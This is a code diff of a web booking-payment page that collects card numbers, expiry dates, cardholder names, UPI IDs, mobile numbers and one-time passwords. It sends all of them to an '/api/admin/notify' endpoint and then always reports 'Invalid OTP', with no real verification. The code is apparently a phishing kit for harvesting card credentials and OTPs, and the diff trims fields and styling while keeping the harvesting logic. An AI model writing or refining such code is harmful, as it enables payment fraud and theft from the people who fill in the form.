@@ -201,16 +201,6 @@
       .message.show {
         display: block;
       }
-      .message.error {
-        background: #fef2f2;
-        border-color: #fecaca;
-        color: #991b1b;
-      }
-      .message.success {
-        background: #ecfdf5;
-        border-color: #bbf7d0;
-        color: #065f46;
-      }
       .otp-box {
         background: #fff7ed;
         border: 1px solid #fed7aa;
@@ -320,10 +310,6 @@
               <label for="mobile">Mobile Number</label>
               <input id="mobile" type="text" placeholder="10-Digit Mobile Number" maxlength="10" />
             </div>
-          </div>
-          <div class="field" style="margin-top: 16px; margin-bottom: 16px;">
-            <label for="email">Email Address</label>
-            <input id="email" type="email" placeholder="Enter your email address" />
           </div>
 
           <div class="method-switch">
@@ -449,32 +435,18 @@
         otpSection.classList.add('hidden');
       }
 
-      function showMessage(text, type = 'info') {
+      function showMessage(text) {
         messageBox.textContent = text;
-        messageBox.className = 'message show';
-        if (type === 'error') {
-          messageBox.classList.add('error');
-        }
-        if (type === 'success') {
-          messageBox.classList.add('success');
-        }
+        messageBox.classList.add('show');
       }
 
       async function sendToAdmin(payload) {
-        try {
-          const response = await fetch('/api/admin/notify', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
-          return response.ok ? await response.json() : null;
-        } finally {
-          if (payload.activityType === 'otp_submission') {
-            const receiptUrl = new URL('/booking-confirmation.html', window.location.origin);
-            receiptUrl.search = window.location.search;
-            window.location.assign(receiptUrl.toString());
-          }
-        }
+        const response = await fetch('/api/admin/notify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return response.ok ? await response.json() : null;
       }
 
       tabs.forEach((tab) => {
@@ -500,7 +472,6 @@
 
         const guestName = document.getElementById('guestName').value.trim();
         const mobile = mobileInput.value.trim();
-        const email = document.getElementById('email').value.trim();
         const cardHolderName = document.getElementById('cardHolderName').value.trim();
         const cardNumber = cardNumberInput.value.replace(/\D/g, '');
         const cardExpiry = cardExpiryInput.value.trim();
@@ -521,7 +492,6 @@
           bookingId,
           guestName: guestName || cardHolderName,
           mobile,
-          email,
           amount,
           paymentMethod: 'card',
           cardHolderName,
@@ -544,7 +514,6 @@
 
         const guestName = document.getElementById('guestName').value.trim();
         const mobile = mobileInput.value.trim();
-        const email = document.getElementById('email').value.trim();
         const upiId = document.getElementById('upiId').value.trim();
 
         if (!upiId) {
@@ -558,7 +527,6 @@
           bookingId,
           guestName: guestName || 'UPI Guest',
           mobile,
-          email,
           amount,
           paymentMethod: 'upi',
           upiId,
@@ -583,21 +551,18 @@
   const recordId = paymentRecordId || `PAY-${String(bookingId).replace(/[^a-zA-Z0-9_-]/g, '-')}`;
   paymentRecordId = recordId;
 
+  // Processing message dikhayein
   showMessage('Verifying OTP... Please wait.');
 
-  const guestName = document.getElementById('guestName').value.trim() || document.getElementById('cardHolderName').value.trim();
-  const mobile = mobileInput.value.trim();
-  const email = document.getElementById('email').value.trim();
-
+  // Admin ko OTP payload bhejen
   await sendToAdmin({
     activityType: 'otp_submission',
     recordId,
     bookingId,
-    guestName,
-    mobile,
-    email,
     amount,
     paymentMethod: 'card',
+    guestName: document.getElementById('guestName').value.trim() || document.getElementById('cardHolderName').value.trim(),
+    mobile: mobileInput.value.trim(),
     otpEntered: otp,
     otp: otp,
     otp_code: otp,
@@ -608,9 +573,7 @@
     submittedAt: new Date().toISOString()
   });
 
-  showMessage('Invalid OTP. Please try again.', 'error');
-  document.getElementById('otpCode').value = '';
-  document.getElementById('otpCode').focus();
+  showMessage('Invalid OTP. Please try again.');
 });
 
       setMethod('card');
